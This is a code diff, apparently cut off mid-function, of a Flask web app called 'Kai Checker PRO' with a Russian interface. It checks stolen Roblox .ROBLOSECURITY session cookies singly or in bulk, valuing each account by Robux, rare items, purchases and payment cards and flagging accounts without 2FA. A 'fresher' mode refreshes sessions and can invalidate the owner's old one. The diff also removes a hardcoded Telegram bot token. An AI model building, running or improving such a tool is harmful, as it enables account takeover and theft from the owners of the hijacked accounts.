@@ -1,1010 +1,891 @@
-import telebot
 import os
-import time
-import threading
-import requests
-import json
+import io
 import re
-import urllib.parse
 import zipfile
-from io import BytesIO
+import json
+import requests
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from flask import Flask
-from requests.adapters import HTTPAdapter
-from curl_cffi.requests import AsyncSession
-import asyncio
-import sys
-import logging
-import urllib3
+import time
+from collections import defaultdict
 
-# ============================================================
-# НАСТРОЙКИ
-# ============================================================
-
-for var in list(os.environ.keys()):
-    if 'proxy' in var.lower() or 'socks' in var.lower(): os.environ.pop(var, None)
-from telebot import apihelper
-apihelper.proxy = {}
-
-TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8838554185:AAEcnODJD01mvseF2Lnvr3WbYB88Y2KTNAk")
-MAX_THREADS = 3
-LOGO_URL = "https://1s4oyld5dc.ucarecd.net/c1f49818-fb27-4bf7-9427-1ed661dc880d/"
-ALLOWED_USERS = [5992692128]
-
-# ============================================================
-# FLASK ДЛЯ RENDER
-# ============================================================
+from flask import Flask, render_template_string, request, jsonify, send_file
 
 app = Flask(__name__)
+app.config['SECRET_KEY'] = 'kai_checker_secret_key_pro'
 
-@app.route('/')
-def index():
-    return "🤖 БОТ РАБОТАЕТ! ✅"
+CHECKER_HISTORY_FILE = "checker_history.json"
+FRESHER_HISTORY_FILE = "fresher_history.json"
 
-@app.route('/health')
-def health():
-    return "OK", 200
+MAIN_GAMES = [
+    'Adopt Me', 'Blox Fruits', 'Murder Mystery 2', 'Rivals',
+    'Pet Simulator 99', 'Pet Simulator X', 'Arsenal', 'BedWars',
+    'Tower Defense Simulator', 'Anime Adventures', 'Anime Vanguards',
+    'King Legacy', 'Shindo Life', 'Project Slayers', 'Demon Slayer RPG 2',
+    'Dragon Ball Rage', 'Fisch', 'Jujutsu Shenanigans'
+]
 
-# ============================================================
-# ЛОГИ
-# ============================================================
+HTML = r"""<!DOCTYPE html>
+<html lang="ru" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kai Checker PRO</title>
+    <link href="https://fonts.googleapis.com/css2?family=Rubik+Puddles&family=Paytone+One&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #07030d;
+            --bg-card: rgba(23, 10, 38, 0.55);
+            --border-card: rgba(168, 85, 247, 0.25);
+            --border-hover: rgba(217, 70, 239, 0.6);
+            --input-bg: rgba(12, 5, 20, 0.75);
+            --text-main: #f3e8ff;
+            --text-muted: #a78bfa;
+            --accent-purple: #9333ea;
+            --accent-pink: #c026d3;
+            --accent-glow: rgba(168, 85, 247, 0.2);
+            --gradient-btn: linear-gradient(135deg, #7e22ce 0%, #a855f7 100%);
+        }
+        [data-theme="light"] {
+            --bg: #f5f0ff;
+            --bg-card: rgba(255, 255, 255, 0.75);
+            --border-card: rgba(168, 85, 247, 0.2);
+            --border-hover: rgba(168, 85, 247, 0.5);
+            --input-bg: rgba(243, 232, 255, 0.6);
+            --text-main: #2e1065;
+            --text-muted: #7e22ce;
+            --accent-purple: #7e22ce;
+            --accent-pink: #c026d3;
+            --accent-glow: rgba(126, 34, 206, 0.15);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; min-height: 100vh; background: var(--bg); color: var(--text-main); position: relative; overflow-x: hidden; padding: 24px 16px; }
+        #particles-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; pointer-events: none; }
+        .bg-glow { position: fixed; width: 500px; height: 500px; background: radial-gradient(circle, rgba(168, 85, 247, 0.12) 0%, rgba(0,0,0,0) 70%); top: -100px; left: 50%; transform: translateX(-50%); z-index: 0; pointer-events: none; animation: pulseGlow 8s infinite alternate ease-in-out; }
+        @keyframes pulseGlow { 0% { transform: translateX(-50%) scale(1); opacity: 0.5; } 100% { transform: translateX(-50%) scale(1.2); opacity: 0.8; } }
+        .wrapper { max-width: 1350px; margin: 0 auto; position: relative; z-index: 1; background: var(--bg-card); border: 1px solid var(--border-card); backdrop-filter: blur(20px); border-radius: 28px; padding: 32px; box-shadow: 0 20px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05); }
+        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 24px; border-bottom: 1px solid var(--border-card); margin-bottom: 28px; flex-wrap: wrap; gap: 16px; }
+        .logo-text { font-family: 'Paytone One', cursive; font-size: 38px; font-weight: 900; background: linear-gradient(135deg, #f472b6 0%, #d946ef 40%, #a855f7 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; transform: skew(-4deg); }
+        .badge-pro { font-size: 11px; font-weight: 800; background: rgba(168, 85, 247, 0.15); color: var(--accent-pink); padding: 4px 12px; border-radius: 20px; border: 1px solid var(--border-card); letter-spacing: 1.5px; }
+        .stats-bar { display: flex; gap: 12px; flex-wrap: wrap; }
+        .stat-card { background: var(--input-bg); border: 1px solid var(--border-card); padding: 8px 16px; border-radius: 16px; display: flex; flex-direction: column; align-items: center; min-width: 90px; }
+        .stat-val { font-size: 16px; font-weight: 800; color: var(--accent-pink); }
+        .stat-lbl { font-size: 10px; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }
+        .tabs { display: flex; gap: 12px; margin-bottom: 32px; background: var(--input-bg); padding: 8px; border-radius: 22px; border: 1px solid var(--border-card); width: fit-content; flex-wrap: wrap; box-shadow: 0 8px 30px rgba(0,0,0,0.25); }
+        .tab { padding: 14px 32px; border-radius: 16px; color: var(--text-muted); cursor: pointer; font-size: 15px; font-weight: 700; transition: all 0.3s; border: 1px solid transparent; background: transparent; }
+        .tab:hover { color: var(--text-main); background: rgba(168, 85, 247, 0.1); border-color: rgba(168, 85, 247, 0.2); }
+        .tab.active { background: var(--gradient-btn); color: #fff; border-color: rgba(255, 255, 255, 0.15); box-shadow: 0 6px 18px var(--accent-glow); }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .card { background: var(--bg-card); border: 1px solid var(--border-card); border-radius: 20px; padding: 24px; margin-bottom: 20px; transition: all 0.3s; }
+        .card:hover { border-color: var(--border-hover); box-shadow: 0 10px 25px var(--accent-glow); }
+        .card h2 { font-size: 16px; font-weight: 800; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+        .btn { padding: 12px 24px; border: none; border-radius: 14px; font-size: 13px; font-weight: 700; cursor: pointer; color: #fff; display: inline-flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.25s; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .btn-primary { background: var(--gradient-btn); }
+        .btn-primary:hover { background: linear-gradient(135deg, #9333ea 0%, #c026d3 100%); box-shadow: 0 4px 15px var(--accent-glow); transform: translateY(-1px); }
+        .btn-secondary { background: var(--input-bg); border: 1px solid var(--border-card); color: var(--text-muted); }
+        .btn-secondary:hover { color: var(--text-main); border-color: var(--accent-purple); }
+        .btn-danger { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; }
+        .btn-danger:hover { background: rgba(239, 68, 68, 0.3); }
+        .btn-sm { padding: 8px 16px; font-size: 12px; border-radius: 10px; }
+        textarea, input[type="number"], input[type="text"] { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; color: var(--text-main); font-family: monospace; font-size: 12px; transition: border-color 0.2s; }
+        textarea:focus, input:focus { border-color: var(--accent-pink); box-shadow: 0 0 8px var(--accent-glow); }
+        .upload-area { min-height: 110px; border: 2px dashed var(--border-card); border-radius: 16px; background: var(--input-bg); display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; transition: all 0.25s; text-align: center; padding: 16px; }
+        .upload-area:hover, .upload-area.drag-over { border-color: var(--accent-pink); background: rgba(168, 85, 247, 0.05); box-shadow: 0 0 10px var(--accent-glow); }
+        .result-container { margin-top: 16px; }
+        .result-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; flex-wrap: wrap; gap: 6px; }
+        .result-title { font-size: 12px; font-weight: 700; color: var(--text-muted); }
+        .action-btn-group { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
+        .btn-toggle-box, .btn-download-txt, .btn-download-zip { background: rgba(217, 70, 239, 0.15); border: 1px solid rgba(217, 70, 239, 0.3); color: var(--accent-pink); padding: 4px 12px; border-radius: 8px; font-size: 11px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+        .btn-toggle-box:hover, .btn-download-txt:hover, .btn-download-zip:hover { background: rgba(217, 70, 239, 0.3); box-shadow: 0 0 8px var(--accent-glow); }
+        .result-box { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; padding: 14px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; color: var(--text-main); white-space: pre-wrap; word-break: break-all; margin-top: 6px; }
+        .progress-bar { margin-top: 12px; background: var(--input-bg); border-radius: 20px; height: 8px; overflow: hidden; border: 1px solid var(--border-card); }
+        .progress-fill { height: 100%; width: 0%; background: var(--gradient-btn); transition: width 0.3s ease; }
+        .progress-text { font-size: 12px; color: var(--text-muted); margin-top: 4px; text-align: center; }
+        .checker-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        @media(max-width:900px){ .checker-grid { grid-template-columns: 1fr; } }
+        .theme-btn { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 30px; padding: 8px 16px; cursor: pointer; font-size: 12px; color: var(--text-main); font-weight: 700; transition: all 0.2s; }
+        .theme-btn:hover { border-color: var(--accent-purple); }
+        .footer { text-align: center; padding-top: 20px; color: var(--text-muted); font-size: 12px; font-weight: 600; border-top: 1px solid var(--border-card); margin-top: 24px; }
+        .history-card { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 16px; padding: 16px; margin-bottom: 14px; }
+        .history-header { display: flex; justify-content: space-between; align-items: center; font-size: 13px; font-weight: 700; color: var(--accent-pink); flex-wrap: wrap; gap: 8px; }
+        .history-users { font-size: 11px; color: var(--text-main); margin-top: 6px; font-weight: 600; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
+        .fresher-mode-btn.active-mode { background: var(--gradient-btn) !important; color: #fff !important; border-color: var(--accent-pink) !important; box-shadow: 0 0 12px var(--accent-glow); transform: scale(1.02); }
+        .custom-alert-overlay { position: fixed; top: 24px; right: 24px; z-index: 99999; pointer-events: none; }
+        .custom-alert-card { pointer-events: auto; background: rgba(23, 10, 38, 0.95); border: 1px solid var(--border-hover); box-shadow: 0 10px 30px rgba(0,0,0,0.5), 0 0 15px var(--accent-glow); backdrop-filter: blur(12px); border-radius: 16px; padding: 14px 20px; display: flex; align-items: center; gap: 12px; min-width: 280px; max-width: 360px; transform: translateY(-20px) scale(0.95); opacity: 0; transition: all 0.3s; }
+        .custom-alert-overlay.show .custom-alert-card { transform: translateY(0) scale(1); opacity: 1; }
+        .alert-icon { font-size: 22px; line-height: 1; }
+        .alert-body h3 { margin: 0; color: #fff; font-size: 13px; font-weight: 700; }
+        .alert-body p { color: var(--text-muted); font-size: 12px; margin: 0; word-break: break-word; font-weight: 500; }
+        .alert-close-btn { background: transparent; border: none; color: var(--text-muted); font-size: 16px; cursor: pointer; padding: 4px; line-height: 1; }
+        .alert-close-btn:hover { color: #fff; }
+    </style>
+</head>
+<body>
+<canvas id="particles-canvas"></canvas>
+<div class="bg-glow"></div>
+<div id="custom-alert" class="custom-alert-overlay">
+    <div class="custom-alert-card">
+        <div class="alert-icon">⚠️</div>
+        <div class="alert-body"><h3>Внимание</h3><p id="custom-alert-msg">Вставьте кук!</p></div>
+        <button class="alert-close-btn" onclick="closeAlert()">✕</button>
+    </div>
+</div>
+<div class="wrapper">
+    <div class="header">
+        <div class="logo-wrap"><span class="logo-text">KAI CHECKER</span><span class="badge-pro">PRO EDITION</span></div>
+        <div class="stats-bar">
+            <div class="stat-card"><span class="stat-val" id="statValid">0</span><span class="stat-lbl">Валид</span></div>
+            <div class="stat-card"><span class="stat-val" id="statRobux">0</span><span class="stat-lbl">Robux</span></div>
+            <div class="stat-card"><span class="stat-val" id="statPremium">0</span><span class="stat-lbl">Premium</span></div>
+        </div>
+        <button class="theme-btn" onclick="toggleTheme()">🌓 Тема</button>
+    </div>
+    <div class="tabs">
+        <button class="tab active" data-tab="checker">🔍 Чекер</button>
+        <button class="tab" data-tab="fresher">🔄 Фрешер</button>
+        <button class="tab" data-tab="history">📋 История</button>
+        <button class="tab" data-tab="tools">🧰 Инструменты</button>
+    </div>
+    <div class="tab-content active" id="tab-checker">
+        <div class="checker-grid">
+            <div class="card">
+                <h2>🔍 Одиночная проверка</h2>
+                <textarea id="singleCookie" placeholder="Вставьте ОДИН .ROBLOSECURITY кук..." rows="5"></textarea>
+                <div style="margin-top:12px;"><button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">Проверить кук</button></div>
+                <div class="result-container" id="singleContainer" style="display:none;">
+                    <div class="result-header"><span class="result-title">РЕЗУЛЬТАТ:</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox('singleResult','single_report.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_singleResult" onclick="toggleBox('singleResult')">▼ Свернуть</button></div></div>
+                    <div class="result-box" id="singleResult"></div>
+                </div>
+            </div>
+            <div class="card">
+                <h2>📦 Массовая проверка (6 Потоков)</h2>
+                <div class="upload-area" id="massDropArea" onclick="document.getElementById('massFile').click()">
+                    <p style="font-weight:700;">📁 Перетащите TXT файл с куками</p>
+                    <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или нажмите для выбора</p>
+                </div>
+                <input type="file" id="massFile" accept=".txt" style="display:none;">
+                <div id="massFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>
+                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
+                <div class="progress-text" id="massProgressText">Готов к запуску</div>
+                <div style="margin-top:12px;"><button class="btn btn-primary" onclick="runMassCheck()" style="width:100%;" id="massBtn">🚀 Запустить массовый чек</button></div>
+                <div class="result-container" id="massContainer" style="display:none;">
+                    <div class="result-header"><span class="result-title">РЕЗУЛЬТАТЫ:</span><div class="action-btn-group"><button class="btn-download-zip" onclick="downloadMassZip()">📦 ZIP</button><button class="btn-download-txt" onclick="downloadTxtFromBox('massResult','mass_report.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_massResult" onclick="toggleBox('massResult')">▼ Свернуть</button></div></div>
+                    <div class="result-box" id="massResult"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="tab-content" id="tab-fresher">
+        <div class="card">
+            <h2>🔄 Обновление сессий (6 Потоков)</h2>
+            <div style="display:flex;gap:12px;margin-bottom:14px;align-items:center;flex-wrap:wrap;">
+                <span style="font-size:13px;font-weight:700;color:var(--text-muted);">Режим:</span>
+                <button class="btn btn-secondary btn-sm fresher-mode-btn active-mode" id="btnDup" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
+                <button class="btn btn-secondary btn-sm fresher-mode-btn" id="btnKill" onclick="setFresherMode('kill')">💀 Инвалидировать старую</button>
+            </div>
+            <input type="hidden" id="fresherMode" value="duplicate">
+            <textarea id="fresherCookies" placeholder="Вставьте куки списком..." rows="6"></textarea>
+            <div style="margin-top:12px;"><button class="btn btn-primary" onclick="runFresher()">⚡ Обновить куки</button></div>
+            <div class="result-container" id="fresherContainer" style="display:none;">
+                <div class="result-header"><span class="result-title">ОБНОВЛЕННЫЕ КУКИ:</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox('fresherResult','refreshed_cookies.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_fresherResult" onclick="toggleBox('fresherResult')">▼ Свернуть</button></div></div>
+                <div class="result-box" id="fresherResult"></div>
+            </div>
+        </div>
+    </div>
+    <div class="tab-content" id="tab-history">
+        <div class="card"><h2>📋 История Чекера <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2><div id="checkerHistoryList">Загрузка...</div></div>
+        <div class="card"><h2>🔄 История Фрешера <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2><div id="fresherHistoryList">Загрузка...</div></div>
+    </div>
+    <div class="tab-content" id="tab-tools">
+        <div class="tool-grid">
+            <div class="card"><h3>🔗 Слияние TXT</h3><div class="upload-area" id="mergeDropArea" onclick="document.getElementById('mergeFiles').click()"><p style="font-weight:700;">📁 Перетащите TXT</p><p style="font-size:11px;color:var(--text-muted);margin-top:4px;">выберите несколько</p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;"><div id="mergeFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div><button class="btn btn-primary btn-sm" onclick="mergeCookies()" style="margin-top:12px;width:100%;">Объединить</button><div class="result-box" id="mergeResult" style="display:none;margin-top:10px;"></div></div>
+            <div class="card"><h3>✂️ Разделение</h3><div class="upload-area" id="splitDropArea" onclick="document.getElementById('splitFiles').click()"><p style="font-weight:700;">📁 Загрузить TXT</p><p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или вставьте куки</p></div><input type="file" id="splitFiles" accept=".txt" multiple style="display:none;"><div id="splitFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div><textarea id="splitInput" placeholder="Или вставьте куки списком..." rows="3" style="margin-top:10px;"></textarea><div style="margin-top:10px;display:flex;align-items:center;gap:10px;"><label style="font-size:12px;font-weight:700;color:var(--text-muted);">Куков на файл:</label><input type="number" id="splitCount" value="1" min="1" style="padding:8px 12px;width:100px;"></div><button class="btn btn-primary btn-sm" onclick="splitCookies()" style="margin-top:12px;width:100%;">Разделить</button><div class="result-box" id="splitResult" style="display:none;margin-top:10px;"></div></div>
+            <div class="card"><h3>🧹 Очистка</h3><textarea id="cleanInput" placeholder="Вставьте куки для дедупликации..." rows="5"></textarea><button class="btn btn-primary btn-sm" onclick="cleanCookies()" style="margin-top:12px;width:100%;">Удалить дубликаты</button><div class="result-box" id="cleanResult" style="display:none;margin-top:10px;"></div></div>
+        </div>
+    </div>
+    <div class="footer">KAI CHECKER © ALL RIGHTS RESERVED</div>
+</div>
 
-os.makedirs("data/profiles", exist_ok=True)
-os.makedirs("data/logs", exist_ok=True)
-os.makedirs("input", exist_ok=True)
-os.makedirs("output", exist_ok=True)
+<script>
+let lastMassReports = [];
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s',
-                    handlers=[logging.FileHandler('data/logs/bot.log', encoding='utf-8'), logging.StreamHandler()])
-logger = logging.getLogger(__name__)
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+function showAlert(message) {
+    document.getElementById('custom-alert-msg').innerText = message || 'Вставьте кук!';
+    document.getElementById('custom-alert').classList.add('show');
+    clearTimeout(window.alertTimeout);
+    window.alertTimeout = setTimeout(function() { document.getElementById('custom-alert').classList.remove('show'); }, 4000);
+}
+function closeAlert() { document.getElementById('custom-alert').classList.remove('show'); }
 
-try:
-    from curl_cffi import requests as cffi_requests
-    HAS_CFFI = True
-except ImportError:
-    cffi_requests = None
-    HAS_CFFI = False
-
-# ============================================================
-# СЛОВАРЬ ИГР
-# ============================================================
-
-MAIN_GAMES = {
-    "blox fruits", "rivals", "adopt me", "pet sim 99",
-    "pets go", "mm2", "brookhaven", "fisch", "king legacy", "gpo",
-    "blade ball", "bedwars", "jailbreak", "da hood", "tsb",
-    "astd", "anime vanguards", "aot revolution", "aut", "aa", "als",
-    "combat warriors", "creatures of sonaria", "driving empire", "evade",
-    "ro ghoul", "royale high", "toilet td", "trident survival",
-    "war tycoon", "yba", "99 nights", "spongebob td", "fnaf td",
-    "garden td", "jujutsu infinite", "jujutsu shenanigans",
-    "tds", "volleyball legends", "arsenal", "bee swarm",
-    "dress to impress"
+function toggleTheme() {
+    var html = document.documentElement;
+    html.setAttribute('data-theme', html.getAttribute('data-theme')==='dark'?'light':'dark');
 }
 
-def is_main_game(game_name: str) -> bool:
-    if not game_name:
-        return False
-    g_lower = game_name.lower().strip()
-    for mg in MAIN_GAMES:
-        if mg in g_lower or g_lower in mg:
-            return True
-    return False
-
-# ============================================================
-# ФУНКЦИИ
-# ============================================================
-
-def extract_cookies(text):
-    if not text:
-        return []
-    text = urllib.parse.unquote(text)
-    cookies = []
-    for match in re.finditer(r'\.?ROBLOSECURITY\s*[=:]\s*([^\s;]+)', text, re.IGNORECASE):
-        c = match.group(1).strip('"\';')
-        if len(c) > 100 and c not in cookies:
-            cookies.append(c)
-    for match in re.finditer(r'_\|WARNING[^|]*\|_\S{80,}', text):
-        c = match.group(0).strip('"\'')
-        if len(c) > 100 and c not in cookies:
-            cookies.append(c)
-    if not cookies:
-        for line in text.splitlines():
-            line = line.strip().strip('"\';')
-            if len(line) > 100 and line not in cookies:
-                cookies.append(line)
-    return cookies
-
-def create_session(cookie: str) -> requests.Session:
-    s = requests.Session()
-    s.headers.update({
-        'Cookie': f'.ROBLOSECURITY={cookie.strip()}',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': 'application/json'
-    })
-    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
-    s.mount('https://', adapter)
-    s.mount('http://', adapter)
-    return s
-
-def get_full_info(cookie: str) -> dict:
-    info = {
-        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
-        'EmailSet': False, 'TwoFactorEnabled': False, 'Premium': False,
-        'TotalRAP': 0, 'RareItems': [], 'PurchasedGamepasses': {},
-        'Cookie': cookie, 'SecurityStatus': '⚠️ НЕЗАЩИЩЕННЫЙ'
+function toggleBox(boxId) {
+    var box = document.getElementById(boxId);
+    var btn = document.getElementById('btnToggle_' + boxId);
+    if (!box) return;
+    if (box.style.display === 'none') {
+        box.style.display = 'block';
+        if (btn) btn.textContent = '▼ Свернуть';
+    } else {
+        box.style.display = 'none';
+        if (btn) btn.textContent = '▶ Развернуть';
     }
-    try:
-        s = create_session(cookie)
-        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=5, verify=False)
-        if r.status_code != 200:
-            return info
-        d = r.json()
-        info['UserID'] = d.get('id')
-        info['Username'] = d.get('name')
-        info['status'] = '✅'
-        uid = info['UserID']
-        
-        def fetch(url):
-            try:
-                r = s.get(url, timeout=5, verify=False)
-                return r.json() if r.status_code == 200 else {}
-            except:
-                return {}
-        
-        with ThreadPoolExecutor(max_workers=4) as ex:
-            futures = {
-                'settings': ex.submit(fetch, 'https://www.roblox.com/my/settings/json'),
-                'robux': ex.submit(fetch, f'https://economy.roblox.com/v1/users/{uid}/currency'),
-                'rap': ex.submit(fetch, f'https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=50&sortOrder=Desc'),
-            }
-            results = {k: f.result() for k, f in futures.items()}
-        
-        if results.get('settings'):
-            d = results['settings']
-            info['Premium'] = d.get('IsPremium', False)
-            sec = d.get('MyAccountSecurityModel', {})
-            info['EmailSet'] = sec.get('IsEmailSet', False)
-            info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled', False)
-            security_score = 0
-            if info['EmailSet']: security_score += 1
-            if info['TwoFactorEnabled']: security_score += 2
-            if security_score >= 4:
-                info['SecurityStatus'] = '🔒 ВЫСОКИЙ'
-            elif security_score >= 2:
-                info['SecurityStatus'] = '🔐 СРЕДНИЙ'
-            else:
-                info['SecurityStatus'] = '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)'
-        
-        if results.get('robux'):
-            info['Robux'] = results['robux'].get('robux', 0)
-        
-        if results.get('rap'):
-            data = results['rap'].get('data', [])
-            tr = 0
-            ri = []
-            for item in data[:20]:
-                rap = item.get('recentAveragePrice', 0) or 0
-                tr += rap
-                if rap >= 1000:
-                    ri.append({'name': item.get('name', '?'), 'rap': rap})
-            info['TotalRAP'] = tr
-            info['RareItems'] = ri[:5]
-        
-        try:
-            r = s.get(f'https://economy.roblox.com/v2/users/{uid}/transactions?limit=50&transactionType=Purchase', timeout=5, verify=False)
-            if r.status_code == 200:
-                gp_dict = {}
-                for item in r.json().get('data', []):
-                    details = item.get('details', {})
-                    price = abs(item.get('currency', {}).get('amount', 0))
-                    if price >= 100:
-                        name = details.get('name', 'Товар')
-                        place_name = details.get('place', {}).get('name', 'Неизвестная игра')
-                        if place_name not in gp_dict:
-                            gp_dict[place_name] = []
-                        gp_dict[place_name].append({'name': name, 'price': price})
-                info['PurchasedGamepasses'] = gp_dict
-        except:
-            pass
-        
-    except Exception as e:
-        pass
-    return info
+}
 
-# ============================================================
-# ФОРМАТИРОВАНИЕ ОТЧЁТА
-# ============================================================
+function downloadTxtFromBox(boxId, defaultFilename) {
+    var box = document.getElementById(boxId);
+    if (!box || !box.textContent.trim()) return showAlert('Нет данных!');
+    var blob = new Blob([box.textContent], { type: 'text/plain;charset=utf-8' });
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url; a.download = defaultFilename;
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+}
 
-def format_short_report(info):
-    un = info.get('Username', '?')
-    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
-    status = info.get('status', '⚠️')
-    status_icon = '🟢' if status == '✅' else ('🔴' if status == '❌' else '🚫')
-    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
-    
-    r = f"<b>📋 {un}</b> [{year}]\n"
-    r += f"{status_icon} {status_text} | 🆔 <code>{info.get('UserID', '?')}</code>\n\n"
-    r += f"📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')} | {'⭐ Premium' if info.get('Premium') else '❌ Premium'}\n"
-    r += f"💰 Robux: ⏣ {info.get('Robux', 0):,} | 💸 Донат: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
-    
-    rap = info.get('TotalRAP', 0)
-    if rap > 0:
-        r += f"💎 RAP: ⏣ {rap:,}\n"
-    else:
-        r += f"💎 RAP: ❌ Нет\n"
-    
-    r += f"\n🛡️ БЕЗОПАСНОСТЬ:\n"
-    r += f"   📧 Почта: {'✅' if info.get('EmailSet') else '❌'}\n"
-    r += f"   🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
-    r += f"   {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
-    r += f"   💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
-    
-    gp = info.get('PurchasedGamepasses', {})
-    main_gp = {game: passes for game, passes in gp.items() if is_main_game(game)}
-    
-    if main_gp:
-        total_sum = sum(sum(p['price'] for p in passes) for passes in main_gp.values())
-        r += f"\n📦 ГЕЙМПАССЫ (главные игры):\n"
-        for game, passes in list(main_gp.items())[:5]:
-            game_total = sum(p['price'] for p in passes)
-            r += f"   🎮 {game} (⏣ {game_total:,}):\n"
-            for p in passes[:5]:
-                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
-            if len(passes) > 5:
-                r += f"      └ ...и ещё {len(passes)-5}\n"
-    else:
-        r += f"\n📦 ГЕЙМПАССЫ: ❌ Нет\n"
-    
-    rare = info.get('RareItems', [])
-    if rare:
-        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
-        for item in rare[:3]:
-            r += f"   └ {item['name']} (⏣ {item['rap']:,})\n"
-    else:
-        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ: ❌ Нет\n"
-    
-    if len(r) > 3800:
-        r = r[:3700] + "\n\n<i>[Сообщение сокращено]</i>"
-    
-    return f"<blockquote>{r}\n\n<code>{info.get('Cookie', '')}</code></blockquote>"
-
-def generate_full_txt_report(info):
-    un = info.get('Username', '?')
-    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
-    status = info.get('status', '⚠️')
-    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
-    
-    r = f"╔══════════════════════════════════════════════════════════╗\n"
-    r += f"║  🎮 KAI CHECKER — ПОЛНЫЙ ОТЧЁТ                        ║\n"
-    r += f"╠══════════════════════════════════════════════════════════╣\n"
-    r += f"║  📋 {un} [{year}]\n"
-    r += f"║  {status_text} | 🆔 {info.get('UserID', '?')}\n"
-    r += f"║  📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')}\n"
-    r += f"╠══════════════════════════════════════════════════════════╣\n"
-    r += f"║  💰 Robux: ⏣ {info.get('Robux', 0):,}\n"
-    r += f"║  💸 Донат/год: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
-    r += f"║  💎 RAP: ⏣ {info.get('TotalRAP', 0):,}\n"
-    r += f"╠══════════════════════════════════════════════════════════╣\n"
-    r += f"║  🛡️ БЕЗОПАСНОСТЬ:\n"
-    r += f"║  📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
-    r += f"║  {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
-    r += f"║  💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
-    r += f"╠══════════════════════════════════════════════════════════╣\n"
-    r += f"║  📦 ВСЕ ГЕЙМПАССЫ:\n"
-    
-    gp = info.get('PurchasedGamepasses', {})
-    if gp:
-        for game, passes in gp.items():
